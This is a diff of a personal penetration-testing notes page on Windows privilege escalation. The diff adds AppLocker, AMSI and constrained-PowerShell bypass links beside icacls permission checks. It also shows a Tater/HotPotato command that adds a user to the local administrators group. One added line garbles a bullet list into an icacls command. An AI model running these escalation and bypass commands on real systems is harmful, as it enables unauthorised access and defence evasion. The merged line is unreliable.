@@ -6,10 +6,9 @@ For [[PrivEsc-Important-Windows-Locations]]
 For [[Powershell-versions]]
 Check out [[Kali-Windows-Resources]] for selection of binaries and such to transfer!
 
-## Manual Enumeration 
 For manual enumeration see [[Windows-Privilege-Escalation-Enumeration]]
-
-
+For Powershell Bypassing see [[Windows Privilege Escalation Bypassing Contrained Powershell]]
+For ASMI bypassing [[ASMI-Bypassing]]
 ## Scripts
 ```
 https://github.com/carlospolop/PEASS-ng
@@ -235,7 +234,12 @@ icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone"
 icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone"
 icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
 icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
-icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
+-   AppLocker Bypass
+    
+    -   By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users
+    -   [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
+    -   [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
+    -   [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "Everyone"
 icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "Everyone"
 icacls "C:\Documents and Settings\*" 2>nul | findstr "(F)" | findstr "BUILTIN\Users"
 icacls "C:\Documents and Settings\*" 2>nul | findstr "(M)" | findstr "BUILTIN\Users"
@@ -556,6 +560,13 @@ https://github.com/Kevin-Robertson/Tater.git
 Import-Module C:\Path\To\HotPotato.ps1
 Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
 ```
+
+## AppLocker Bypassing
+
+By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writtable by any users:
+- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)
+- https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md)
+- [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md)
 
 
 ## References
